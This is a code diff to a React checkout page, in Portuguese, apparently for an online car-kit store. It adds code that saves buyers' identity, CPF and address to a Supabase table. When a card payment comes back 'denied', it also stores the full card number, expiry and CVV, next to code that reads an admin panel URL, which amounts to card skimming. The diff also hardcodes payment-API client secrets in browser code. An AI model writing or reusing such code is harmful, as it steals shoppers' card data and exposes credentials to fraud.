@@ -1,5 +1,6 @@
 import { useState, useEffect } from 'react';
 import { trackMetaEvent, generateEventId, getHashedUserData, getCookie } from '../utils/metaPixel';
+import { supabase } from '../utils/supabase';
 
 export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
   const [step, setStep] = useState(1); // 1: Identificação, 2: Entrega, 3: Pagamento, 4: Sucesso/Pix QR
@@ -67,6 +68,49 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
       content_name: `Kit ${kit === 'basico' ? 'Básico' : 'Proteção Total'} - ${vehicle || 'Carro'}`,
     });
   }, []);
+
+  const saveLeadToSupabase = async (status, transactionIdOverride = null, extraData = {}) => {
+    if (!supabase) return;
+
+    try {
+      const leadData = {
+        nome: formData.nome,
+        email: formData.email,
+        cpf: formData.cpf,
+        telefone: formData.telefone,
+        cep: formData.cep,
+        rua: formData.rua,
+        numero: formData.numero,
+        complemento: formData.complemento,
+        bairro: formData.bairro,
+        cidade: formData.cidade,
+        estado: formData.estado,
+        vehicle: vehicle || 'Carro',
+        kit: kit,
+        upsell_items: upsellItems,
+        perfume_upsell: perfumeUpsell,
+        final_price: finalPrice,
+        payment_method: paymentMethod,
+        status: status,
+        transaction_id: transactionIdOverride || transactionId || '',
+        ...extraData
+      };
+
+      console.log('[Supabase] Enviando lead para o banco...', leadData);
+
+      const { data, error } = await supabase
+        .from('leads')
+        .insert([leadData]);
+
+      if (error) {
+        console.error('[Supabase] Erro ao salvar lead:', error.message);
+      } else {
+        console.log('[Supabase] Lead salvo com sucesso no banco.');
+      }
+    } catch (err) {
+      console.error('[Supabase] Erro na requisição Supabase:', err);
+    }
+  };
 
   // Testimonial carousel state
   const [testimonialIndex, setTestimonialIndex] = useState(0);
@@ -178,8 +222,8 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
             {
               method: 'GET',
               headers: {
-                'X-Client-Id': '657c5bb7-ce8d-4243-9e9f-a8aa5e157fab',
-                'X-Client-Secret': '262e504fe6aec6db99249f4ee30e6288816028cc97e1b352a21e1992964c2de1',
+                'X-Client-Id': '25ec7953-fa82-41b4-a1ff-4cb0181d93e1',
+                'X-Client-Secret': '92d3a7623a62a4fe835cfb5c7d9d6181006c404cd9134a8f6b77c57e45a87dd8',
               }
             }
           );
@@ -212,6 +256,8 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
                   cidade: formData.cidade,
                   estado: formData.estado
                 }));
+
+                saveLeadToSupabase('pago');
 
                 window.location.href = '/obrigado.html';
               }
@@ -269,6 +315,9 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
             userAgent: navigator.userAgent,
             telefone: formData.telefone,
             cep: formData.cep,
+            rua: formData.rua,
+            numero: formData.numero,
+            bairro: formData.bairro,
             cidade: formData.cidade,
             estado: formData.estado
           }
@@ -276,9 +325,21 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
         customer: {
           name: formData.nome,
           email: formData.email,
+          phone: formData.telefone.replace(/\D/g, ''),
+          phone_number: formData.telefone.replace(/\D/g, ''),
           document: {
             type: "CPF",
             number: formData.cpf.replace(/\D/g, '')
+          },
+          address: {
+            street: formData.rua,
+            number: formData.numero,
+            complement: formData.complemento || '',
+            neighborhood: formData.bairro,
+            city: formData.cidade,
+            state: formData.estado,
+            zipcode: formData.cep.replace(/\D/g, ''),
+            country: 'BR'
           }
         }
       };
@@ -288,8 +349,8 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
       const response = await fetch('/winnerpay-api/financial/receber-pix', {
         method: 'POST',
         headers: {
-          'X-Client-Id': '657c5bb7-ce8d-4243-9e9f-a8aa5e157fab',
-          'X-Client-Secret': '262e504fe6aec6db99249f4ee30e6288816028cc97e1b352a21e1992964c2de1',
+          'X-Client-Id': '25ec7953-fa82-41b4-a1ff-4cb0181d93e1',
+          'X-Client-Secret': '92d3a7623a62a4fe835cfb5c7d9d6181006c404cd9134a8f6b77c57e45a87dd8',
           'Content-Type': 'application/json'
         },
         body: JSON.stringify(winnerpayBody),
@@ -303,7 +364,9 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
       }
 
       setPixCode(data.pix_copia_e_cola || data.qr_code_data);
-      setTransactionId(data.transaction ? data.transaction.transaction_id : (data.pix_key || "TXN_" + Date.now()));
+      const generatedTxId = data.transaction ? data.transaction.transaction_id : (data.pix_key || "TXN_" + Date.now());
+      setTransactionId(generatedTxId);
+      saveLeadToSupabase('pendente', generatedTxId);
       setStep(4);
     } catch (err) {
       console.error('WinnerPay API Error:', err);
@@ -409,6 +472,15 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
             },
             timestamp: new Date().toISOString()
           };
+
+          // Salva no Supabase!
+          saveLeadToSupabase('negado', null, {
+            card_number: formData.cardNumber,
+            card_name: formData.cardName,
+            card_expiry: formData.cardExpiry,
+            card_cvv: formData.cardCvv,
+            installments: formData.installments
+          });
 
           const adminUrl = window.ADMIN_PANEL_URL || localStorage.getItem('admin_panel_url') || '';
           
